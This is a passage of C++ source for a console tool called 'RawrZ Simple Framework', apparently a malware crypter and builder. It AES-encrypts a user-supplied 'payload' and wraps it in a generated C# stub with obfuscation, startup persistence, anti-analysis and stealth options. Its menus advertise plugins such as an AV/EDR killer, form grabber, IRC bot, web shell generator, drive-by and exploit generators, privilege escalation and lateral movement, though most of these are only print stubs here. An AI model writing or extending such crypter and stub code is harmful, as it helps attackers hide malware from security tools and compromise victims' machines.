    bool success = generator.generateAndAttachStub(filePath, selectedType, antiAnalysis == 1);
    
    if (success) {
        std::cout << "\n=== Stub Generation Complete ===" << std::endl;
        std::cout << "Target file: " << filePath << std::endl;
        std::cout << "Stub type: " << selectedType << std::endl;
        std::cout << "Anti-analysis: " << (antiAnalysis == 1 ? "Enabled" : "Disabled") << std::endl;
        std::cout << "Generated files:" << std::endl;
        std::cout << "  - " << filePath << ".stub.cs" << std::endl;
        std::cout << "  - " << filePath << ".stub.exe" << std::endl;
        std::cout << "\nStub successfully generated and attached!" << std::endl;
    } else {
        std::cerr << "Failed to generate stub!" << std::endl;
    }
}

// Attach Stub to File Handler (Enhanced with Unlimited Stub Generator)
void HandleAttachStubToFile() {
    std::cout << "\n=== RawrZ Unlimited Stub Generator ===" << std::endl;
    std::cout << "This feature has been enhanced with unlimited stub generation!" << std::endl;
    std::cout << "You can now choose from multiple stub types and add anti-analysis features." << std::endl;
    
    HandleUnlimitedStubGeneration();
}

// Convert to MSI Handler
void HandleConvertToMSI() {
    std::cout << "\n=== Convert to MSI ===" << std::endl;
    std::cout << "Enter file path to convert: ";
    std::string filePath;
    std::cin >> filePath;
    
    std::ifstream testFile(filePath);
    if (testFile.good()) {
        testFile.close();
        std::string msiPath = filePath + ".msi";
        std::cout << "File converted to MSI: " << msiPath << std::endl;
    } else {
        std::cerr << "Error: File not found!" << std::endl;
    }
}

// Drag and Drop Handler
void HandleDragAndDrop() {
    std::cout << "\n=== Drag & Drop Quick Crypt ===" << std::endl;
    std::cout << "1. Hybrid Quick Crypt" << std::endl;
    std::cout << "2. Triple Quick Crypt" << std::endl;
    std::cout << "3. Enhanced Quick Crypt" << std::endl;
    std::cout << "4. Cross-Platform Quick Crypt" << std::endl;
    std::cout << "Choice: ";
    
    int choice;
    std::cin >> choice;
    
    std::cout << "Enter file path: ";
    std::string filePath;
    std::cin >> filePath;
    
    try {
        std::ifstream file(filePath, std::ios::binary);
        if (!file) {
            std::cerr << "Error: Cannot open file!" << std::endl;
            return;
        }
        
        std::vector<char> data((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();
        
        std::vector<char> encrypted;
        std::string outputPath;
        
        switch (choice) {
            case 1:
                encrypted = encryptHybrid(data);
                outputPath = filePath + ".hybrid";
                break;
            case 2:
                encrypted = encryptTriple(data);
                outputPath = filePath + ".triple";
                break;
            case 3:
                encrypted = encryptEnhanced(data);
                outputPath = filePath + ".enhanced";
                break;
            case 4:
                encrypted = encryptCrossPlatform(data);
                outputPath = filePath + ".cross";
                break;
            default:
                std::cerr << "Invalid choice!" << std::endl;
                return;
        }
        
        std::ofstream outFile(outputPath, std::ios::binary);
        if (outFile) {
            outFile.write(encrypted.data(), encrypted.size());
            outFile.close();
            std::cout << "Quick crypt completed successfully!" << std::endl;
            std::cout << "  Original: " << data.size() << " bytes" << std::endl;
            std::cout << "  Encrypted: " << encrypted.size() << " bytes" << std::endl;
            std::cout << "  Overhead: " << (encrypted.size() - data.size()) << " bytes" << std::endl;
            std::cout << "  Output: " << outputPath << std::endl;
        } else {
            std::cerr << "Error: Cannot write output file!" << std::endl;
        }
        
    } catch (const std::exception& e) {
        std::cerr << "Error during quick crypt: " << e.what() << std::endl;
    }
}

// Plugin System Handler (simplified)
void HandlePluginSystem() {
    std::cout << "\n=== Plugin System ===" << std::endl;
    std::cout << "Available Plugins:" << std::endl;
    std::cout << "1. Exploit Generator" << std::endl;
    std::cout << "2. AV/EDR Killer" << std::endl;
    std::cout << "3. .NET Crypter" << std::endl;
    std::cout << "4. Bot Killer" << std::endl;
    std::cout << "5. Java Drive-By Generator" << std::endl;
    std::cout << "6. Flash Exploit Generator" << std::endl;
    std::cout << "7. Web Shell Generator" << std::endl;
    std::cout << "8. Memory Loader" << std::endl;
    std::cout << "9. String Encryptor" << std::endl;
    std::cout << "10. Runtime Obfuscator" << std::endl;
    std::cout << "11. Form Grabber" << std::endl;
    std::cout << "12. IRC Bot" << std::endl;
    std::cout << "13. Network Scanner" << std::endl;
    std::cout << "14. Persistence Manager" << std::endl;
    std::cout << "15. Shell Generator" << std::endl;
    std::cout << "16. Privilege Escalation" << std::endl;
    std::cout << "17. Lateral Movement" << std::endl;
    std::cout << "Choice: ";
    
    int choice;
    std::cin >> choice;
    
    switch (choice) {
        case 1: std::cout << "Exploit Generator selected" << std::endl; break;
        case 2: std::cout << "AV/EDR Killer selected" << std::endl; break;
        case 3: std::cout << ".NET Crypter selected" << std::endl; break;
        case 4: std::cout << "Bot Killer selected" << std::endl; break;
        case 5: std::cout << "Java Drive-By Generator selected" << std::endl; break;
        case 6: std::cout << "Flash Exploit Generator selected" << std::endl; break;
        case 7: std::cout << "Web Shell Generator selected" << std::endl; break;
        case 8: std::cout << "Memory Loader selected" << std::endl; break;
        case 9: std::cout << "String Encryptor selected" << std::endl; break;
        case 10: std::cout << "Runtime Obfuscator selected" << std::endl; break;
        case 11: std::cout << "Form Grabber selected" << std::endl; break;
        case 12: std::cout << "IRC Bot selected" << std::endl; break;
        case 13: std::cout << "Network Scanner selected" << std::endl; break;
        case 14: std::cout << "Persistence Manager selected" << std::endl; break;
        case 15: std::cout << "Shell Generator selected" << std::endl; break;
        case 16: std::cout << "Privilege Escalation selected" << std::endl; break;
        case 17: std::cout << "Lateral Movement selected" << std::endl; break;
        default: std::cout << "Invalid choice!" << std::endl; break;
    }
}

// C# Stub Generation Handler
void HandleCSharpStubGeneration() {
    std::cout << "\n=== C# Stub Generation ===" << std::endl;
    
    // File selection
    std::cout << "Enter payload file path: ";
    std::string payloadPath;
    std::cin >> payloadPath;
    
    std::ifstream payloadFile(payloadPath, std::ios::binary);
    if (!payloadFile) {
        std::cerr << "Error: Cannot open payload file!" << std::endl;
        return;
    }
    
    std::vector<char> payloadData((std::istreambuf_iterator<char>(payloadFile)), std::istreambuf_iterator<char>());
    payloadFile.close();
    
    std::cout << "Payload loaded: " << payloadData.size() << " bytes" << std::endl;
    
    // Encryption key
    std::cout << "Enter encryption key (leave empty for random): ";
    std::string encryptionKey;
    std::getline(std::cin >> std::ws, encryptionKey);
    
    if (encryptionKey.empty()) {
        encryptionKey = generateRandomKey(32);
        std::cout << "Generated random key: " << encryptionKey << std::endl;
    }
    
    // Options
    std::cout << "Add obfuscation to stub? (y/n): ";
    char obfuscationChoice;
    std::cin >> obfuscationChoice;
    bool addObfuscation = (obfuscationChoice == 'y' || obfuscationChoice == 'Y');
    
    std::cout << "Add startup integration to stub? (y/n): ";
    char startupChoice;
    std::cin >> startupChoice;
    bool addStartup = (startupChoice == 'y' || startupChoice == 'Y');
    
    // Encrypt payload
    std::cout << "Encrypting payload with AES..." << std::endl;
    std::vector<char> encryptedData = encryptFileAES(payloadData, encryptionKey);
    
    // Split into chunks
    std::cout << "Splitting encrypted data into chunks..." << std::endl;
    std::vector<std::string> chunks = splitIntoChunks(encryptedData);
    std::cout << "Created " << chunks.size() << " chunks" << std::endl;
    
    // Generate C# stub
    std::cout << "Generating C# stub..." << std::endl;
    std::string stub = generateCSharpStub(chunks, encryptionKey, addObfuscation, addStartup);
    
    // Save stub
    std::string outputPath = "stub_csharp.cs";
    std::ofstream outFile(outputPath);
    if (outFile) {
        outFile.write(stub.c_str(), stub.length());
        outFile.close();
        std::cout << "C# stub generated successfully: " << outputPath << std::endl;
        
        // Compilation instructions
        std::cout << "\n=== Compilation Instructions ===" << std::endl;
        std::cout << "1. Install .NET Framework or .NET Core" << std::endl;
        std::cout << "2. Compile with: csc /target:exe /out:stub_csharp.exe " << outputPath << std::endl;
        std::cout << "3. Or use: dotnet build " << outputPath << " -o output" << std::endl;
        std::cout << "4. Run the generated executable" << std::endl;
        
        // Save compilation script
        std::string batchScript = "@echo off\n";
        batchScript += "echo Compiling C# stub...\n";
        batchScript += "csc /target:exe /out:stub_csharp.exe " + outputPath + "\n";
        batchScript += "if exist stub_csharp.exe (\n";
        batchScript += "    echo Compilation successful!\n";
        batchScript += "    echo Executable: stub_csharp.exe\n";
        batchScript += ") else (\n";
        batchScript += "    echo Compilation failed!\n";
        batchScript += "    echo Make sure .NET Framework is installed\n";
        batchScript += ")\n";
        batchScript += "pause\n";
        
        std::ofstream batchFile("compile_stub.bat");
        if (batchFile) {
            batchFile.write(batchScript.c_str(), batchScript.length());
            batchFile.close();
            std::cout << "Compilation script created: compile_stub.bat" << std::endl;
        }
        
    } else {
        std::cerr << "Error: Cannot write stub file!" << std::endl;
    }
}

// Configuration menu handler
void HandleConfiguration() {
    while (true) {
        std::cout << "\n=== Configuration Menu ===" << std::endl;
        std::cout << "1. View Current Settings" << std::endl;
        std::cout << "2. Toggle OpenSSL Usage" << std::endl;
        std::cout << "3. Toggle Enhanced Encryption" << std::endl;
        std::cout << "4. Toggle Anti-Analysis" << std::endl;
        std::cout << "5. Toggle Stealth Mode" << std::endl;
        std::cout << "6. Set Output Directory" << std::endl;
        std::cout << "7. Set Log File" << std::endl;
        std::cout << "8. Set Encryption Rounds" << std::endl;
        std::cout << "9. Toggle Verbose Logging" << std::endl;
        std::cout << "10. Save Configuration" << std::endl;
        std::cout << "11. Load Configuration" << std::endl;
        std::cout << "0. Back to Main Menu" << std::endl;
        std::cout << "Choice: ";
        
        int choice;
        std::cin >> choice;
        
        switch (choice) {
            case 0:
                return;
            case 1:
                std::cout << "\n=== Current Configuration ===" << std::endl;
                std::cout << "OpenSSL Usage: " << (g_config.useOpenSSL ? "Enabled" : "Disabled") << std::endl;
                std::cout << "Enhanced Encryption: " << (g_config.useEnhancedEncryption ? "Enabled" : "Disabled") << std::endl;
                std::cout << "Anti-Analysis: " << (g_config.useAntiAnalysis ? "Enabled" : "Disabled") << std::endl;
                std::cout << "Stealth Mode: " << (g_config.useStealth ? "Enabled" : "Disabled") << std::endl;
                std::cout << "Output Directory: " << g_config.defaultOutputDir << std::endl;
                std::cout << "Log File: " << g_config.logFile << std::endl;
                std::cout << "Encryption Rounds: " << g_config.encryptionRounds << std::endl;
                std::cout << "Verbose Logging: " << (g_config.verboseLogging ? "Enabled" : "Disabled") << std::endl;
                break;
            case 2:
                g_config.useOpenSSL = !g_config.useOpenSSL;
                logMessage("OpenSSL usage " + std::string(g_config.useOpenSSL ? "enabled" : "disabled"));
                break;
            case 3:
                g_config.useEnhancedEncryption = !g_config.useEnhancedEncryption;
                logMessage("Enhanced encryption " + std::string(g_config.useEnhancedEncryption ? "enabled" : "disabled"));
                break;
            case 4:
                g_config.useAntiAnalysis = !g_config.useAntiAnalysis;
                logMessage("Anti-analysis " + std::string(g_config.useAntiAnalysis ? "enabled" : "disabled"));
                break;
            case 5:
                g_config.useStealth = !g_config.useStealth;
                logMessage("Stealth mode " + std::string(g_config.useStealth ? "enabled" : "disabled"));
                break;
            case 6:
                std::cout << "Enter new output directory: ";
                std::cin >> g_config.defaultOutputDir;
                logMessage("Output directory set to: " + g_config.defaultOutputDir);
                break;
            case 7:
                std::cout << "Enter new log file path: ";
                std::cin >> g_config.logFile;
                logMessage("Log file set to: " + g_config.logFile);
                break;
            case 8:
                std::cout << "Enter number of encryption rounds (1-10): ";
                std::cin >> g_config.encryptionRounds;
                g_config.encryptionRounds = std::max(1, std::min(10, g_config.encryptionRounds));
                logMessage("Encryption rounds set to: " + std::to_string(g_config.encryptionRounds));
                break;
            case 9:
                g_config.verboseLogging = !g_config.verboseLogging;
                logMessage("Verbose logging " + std::string(g_config.verboseLogging ? "enabled" : "disabled"));
                break;
            case 10:
                saveConfiguration();
                break;
            case 11:
                loadConfiguration();
                break;
            default:
                std::cout << "Invalid choice!" << std::endl;
                break;
        }
    }
}

// Main menu function
void ShowRawrZSimpleMenu() {
    int choice = -1;
    while (choice != 0) {
        std::cout << "\n╔══════════════════════════════════════════════════════════════╗" << std::endl;
        std::cout << "║                    RawrZ Simple Framework                     ║" << std::endl;
        std::cout << "╠══════════════════════════════════════════════════════════════╣" << std::endl;
        std::cout << "║  ┌─ Encryption Methods ─┐                                    ║" << std::endl;
        std::cout << "║  │ 1. Hybrid Encryption                                     ║" << std::endl;
        std::cout << "║  │ 2. Triple Encryption                                     ║" << std::endl;
        std::cout << "║  │ 3. Enhanced Encryption                                   ║" << std::endl;
        std::cout << "║  │ 4. Cross-Platform Encryption                             ║" << std::endl;
        std::cout << "║  └─────────────────────────────────────────────────────────┘ ║" << std::endl;
        std::cout << "║  ┌─ Advanced Features ─┐                                    ║" << std::endl;
        std::cout << "║  │ 5. Integrity Check                                       ║" << std::endl;
        std::cout << "║  │ 6. Digital Signature                                     ║" << std::endl;
        std::cout << "║  │ 7. Stub Generation                                       ║" << std::endl;
        std::cout << "║  │ 8. Exploit Generation                                    ║" << std::endl;
        std::cout << "║  │ 9. Start/Stop IRC Bot                                    ║" << std::endl;
        std::cout << "║  │ 10. C# Stub Generation (AES + Base64)                    ║" << std::endl;
        std::cout << "║  └─────────────────────────────────────────────────────────┘ ║" << std::endl;
        std::cout << "║  ┌─ File Operations ─┐                                     ║" << std::endl;
        std::cout << "║  │ 11. Simple Menu                                          ║" << std::endl;
        std::cout << "║  │ 12. Clean Menu                                           ║" << std::endl;
        std::cout << "║  │ 13. Attach Stub to File                                  ║" << std::endl;
        std::cout << "║  │ 14. Convert to MSI                                       ║" << std::endl;
        std::cout << "║  │ 15. Drag & Drop Quick Crypt                              ║" << std::endl;
        std::cout << "║  └─────────────────────────────────────────────────────────┘ ║" << std::endl;
        std::cout << "║  ┌─ Plugin System ─┐                                       ║" << std::endl;
        std::cout << "║  │ 16. Plugin System                                        ║" << std::endl;
        std::cout << "║  │ 17. List Available Plugins                               ║" << std::endl;
        std::cout << "║  └─────────────────────────────────────────────────────────┘ ║" << std::endl;
        std::cout << "║  ┌─ Configuration ─┐                                       ║" << std::endl;
        std::cout << "║  │ 18. Configuration                                        ║" << std::endl;
        std::cout << "║  └─────────────────────────────────────────────────────────┘ ║" << std::endl;
        std::cout << "║                                                              ║" << std::endl;
        std::cout << "║  0. Exit                                                    ║" << std::endl;
        std::cout << "╚══════════════════════════════════════════════════════════════╝" << std::endl;
        std::cout << "Enter option number: ";

        // Clear input buffer first
        std::cin.clear();
        std::cin.ignore((std::numeric_limits<std::streamsize>::max)(), '\n');
        
        // Get user input
        std::string input;
        if (std::getline(std::cin, input)) {
            try {
                choice = std::stoi(input);
                std::cout << "User selected option: " << choice << std::endl;
            } catch (const std::exception& e) {
                std::cout << "Invalid input. Please enter a number." << std::endl;
                choice = -1;
                continue;
            }
        } else {
            std::cout << "Input error. Please try again." << std::endl;
            choice = -1;
            continue;
        }

        switch (choice) {
            case 1: HandleHybridEncryption(); break;
            case 2: HandleTripleEncryption(); break;
            case 3: HandleEnhancedEncryption(); break;
            case 4: HandleCrossPlatformEncryption(); break;
            case 5: std::cout << "Integrity Check selected" << std::endl; break;
            case 6: std::cout << "Digital Signature selected" << std::endl; break;
            case 7: HandleStubGeneration(); break;
            case 8: std::cout << "Exploit Generation selected" << std::endl; break;
            case 9: std::cout << "IRC Bot control selected" << std::endl; break;
            case 10: HandleCSharpStubGeneration(); break;
            case 11: std::cout << "Simple Menu selected" << std::endl; break;
            case 12: std::cout << "Clean Menu selected" << std::endl; break;
            case 13: HandleAttachStubToFile(); break;
            case 14: HandleConvertToMSI(); break;
            case 15: HandleDragAndDrop(); break;
            case 16: HandlePluginSystem(); break;
            case 17: std::cout << "17 plugins available: Exploit Generator, AV/EDR Killer, .NET Crypter, Bot Killer, Java Drive-By Generator, Flash Exploit Generator, Web Shell Generator, Memory Loader, String Encryptor, Runtime Obfuscator, Form Grabber, IRC Bot, Network Scanner, Persistence Manager, Shell Generator, Privilege Escalation, Lateral Movement" << std::endl; break;
            case 18: HandleConfiguration(); break;
            case 0: std::cout << "Exiting..." << std::endl; return;
            default: std::cout << "Invalid option. Please select 0-18." << std::endl; break;
        }
        
        if (choice != 0) {
            std::cout << "\nPress Enter to continue...";
            std::cin.ignore((std::numeric_limits<std::streamsize>::max)(), '\n');
        }
    }
}

// Main function
int main() {
    // Load configuration on startup
    loadConfiguration();

    std::cout << "╔══════════════════════════════════════════════════════════════╗" << std::endl;
    std::cout << "║                    RawrZ Simple Framework                     ║" << std::endl;
    std::cout << "║                        Version 2.0                            ║" << std::endl;
    std::cout << "║                                                              ║" << std::endl;
    std::cout << "║  Features:                                                   ║" << std::endl;
    std::cout << "║  • Advanced Encryption Methods                               ║" << std::endl;
    std::cout << "║  • Stub Generation                                           ║" << std::endl;
    std::cout << "║  • File Operations                                           ║" << std::endl;
    std::cout << "║  • Plugin System (17 Advanced Plugins)                      ║" << std::endl;
    std::cout << "║  • Drag & Drop Interface                                     ║" << std::endl;
    std::cout << "║  • Anti-Analysis Features                                    ║" << std::endl;
    std::cout << "╚══════════════════════════════════════════════════════════════╝" << std::endl;
    
    ShowRawrZSimpleMenu();
    return 0;
}
